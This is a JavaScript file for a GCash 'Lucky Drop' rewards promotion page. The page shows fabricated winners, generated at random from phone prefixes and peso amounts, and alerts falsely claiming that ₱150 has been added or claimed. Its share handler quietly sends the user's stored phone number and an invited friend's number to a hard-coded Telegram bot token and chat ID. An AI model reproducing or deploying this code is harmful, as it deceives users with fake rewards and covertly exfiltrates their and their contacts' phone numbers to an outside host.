// ========== MAIN TIMER (DROP ENDS IN - May 1, 2026) ==========
function initMainTimer() {
    var timerDisplay = document.getElementById('mainTimerDisplay');
    if (!timerDisplay) return;
    
    var target = new Date(2026, 4, 1, 0, 0, 0);
    
    function updateTimer() {
        var now = new Date();
        var diff = target - now;
        
        if (diff > 0) {
            var days = Math.floor(diff / (1000*60*60*24));
            var hours = Math.floor((diff % (86400000)) / 3600000);
            var mins = Math.floor((diff % 3600000) / 60000);
            var secs = Math.floor((diff % 60000) / 1000);
            timerDisplay.innerHTML = days + "D " + 
                hours.toString().padStart(2,'0') + ":" + 
                mins.toString().padStart(2,'0') + ":" + 
                secs.toString().padStart(2,'0');
        } else {
            timerDisplay.innerHTML = "00D 00:00:00";
        }
    }
    
    updateTimer();
    setInterval(updateTimer, 1000);
    console.log("Main timer started");
}

// ========== WINNER TICKER ==========
function initWinnerTicker() {
    var winnerSpan = document.getElementById('winnerText');
    if (!winnerSpan) return;
    
    var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
    var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
    
    function generateRandomWinner() {
        var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        var last4 = Math.floor(1000 + Math.random() * 9000);
        var amount = amounts[Math.floor(Math.random() * amounts.length)];
        return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
    }
    
    winnerSpan.innerHTML = generateRandomWinner();
    
    setInterval(function() {
        winnerSpan.innerHTML = generateRandomWinner();
    }, 15000);
    
    console.log("Winner ticker started");
}

// ========== CONFETTI ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiAnimation = requestAnimationFrame(draw);
    }
    
    draw();
    
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(function() {
        stopConfetti();
    }, 4000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== PRIZE POPUP ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        startConfetti();
        popup.style.display = 'flex';
    }
}

function closePrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
    stopConfetti();
}

// ========== CARD GOLDEN HIGHLIGHT ==========
function initCardHighlights() {
    var cards = document.querySelectorAll('.prize-card');
    
    for (var i = 0; i < cards.length; i++) {
        var card = cards[i];
        
        card.addEventListener('click', function(e) {
            var clickedCard = this;
            
            clickedCard.style.transition = 'all 0.3s ease';
            clickedCard.style.border = '2px solid #ffd700';
            clickedCard.style.boxShadow = '0 0 20px rgba(255,215,0,0.5)';
            
            startConfetti();
            
            setTimeout(function() {
                clickedCard.style.border = '';
                clickedCard.style.boxShadow = '';
            }, 500);
            
            alert("🎉 +₱150 added! Click CLAIM THRU GCASH to withdraw.");
            e.stopPropagation();
        });
    }
    
    console.log("Card highlights initialized");
}

// ========== SHARE BUTTON ==========
function handleShare() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    // Clear input
    document.getElementById('friendPhoneInput').value = '';
    
    // Update progress bar
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '33%';
    
    // Update status message
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step1">✅ Step 1 completed! Click CLAIM THRU GCASH to get ₱150!</span>';
    }
    
    // Send Telegram
    var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
    fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message))
        .catch(function(e) { console.log("Telegram error:", e); });
    
    // Show popup
    showPrizePopup();
}

function initShareButton() {
    var shareBtn = document.getElementById('shareButton');
    
    if (shareBtn) {
        var newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
        console.log("Share button initialized");
    }
}

// ========== FACEBOOK SHARE ==========
function handleFacebookShare() {
    var shareUrl = "https://xjiligames.github.io/rewards/index.html";
    var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
    
    window.open(fbShareUrl, '_blank', 'width=600,height=400');
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '66%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-step2">✅ Step 2 completed! Share to Facebook done!</span>';
    }
}

function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.onclick = handleFacebookShare;
        
        if (!document.querySelector('.fb-share-info')) {
            var infoText = document.createElement('div');
            infoText.className = 'fb-share-info';
            infoText.style.cssText = 'font-size: 10px; color: #ffaa33; margin-top: 8px; text-align: center;';
            infoText.innerHTML = 'You will receive notification once your share is validated and get +150 bonus Credits';
            fbBtn.parentNode.appendChild(infoText);
        }
    }
}

// ========== CLAIM BUTTON ==========
function handleClaimGCash() {
    alert("💰 ₱150 claimed! Thank you for playing Lucky Drop!");
    
    var progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    var statusMsg = document.getElementById('statusMessage');
    if (statusMsg) {
        statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share to Facebook to get bonus!</span>';
    }
}

function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = function() {
            if (typeof window.showClaimPopup === 'function') {
                window.showClaimPopup(150);
            } else {
                handleClaimGCash();
            }
        };
        console.log("Claim button initialized");
    }
}

// ========== ENTER KEY SUPPORT ==========
function initEnterKeySupport() {
    var friendInput = document.getElementById('friendPhoneInput');
    var shareBtn = document.getElementById('shareButton');
    
    if (friendInput && shareBtn) {
        friendInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                shareBtn.click();
            }
        });
    }
}

// ========== VIDEO AUTOPLAY ==========
function initVideoAutoplay() {
    var video = document.querySelector('.lucky-cat-video video');
    if (video) {
        video.play().catch(function(e) {
            console.log("Autoplay blocked:", e);
            document.body.addEventListener('click', function playOnClick() {
                video.play().catch(function() {});
                document.body.removeEventListener('click', playOnClick);
            });
        });
    }
}

// ========== POPUP CLOSE ON OUTSIDE CLICK ==========
function initPopupClose() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.onclick = function(e) {
            if (e.target === popup) {
                closePrizePopup();
            }
        };
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loading...");
    
    initMainTimer();
    initWinnerTicker();
    initCardHighlights();
    initShareButton();
    initFacebookShare();
    initClaimButton();
    initEnterKeySupport();
    initVideoAutoplay();
    initPopupClose();
    
    console.log("Promotion.js ready");
});
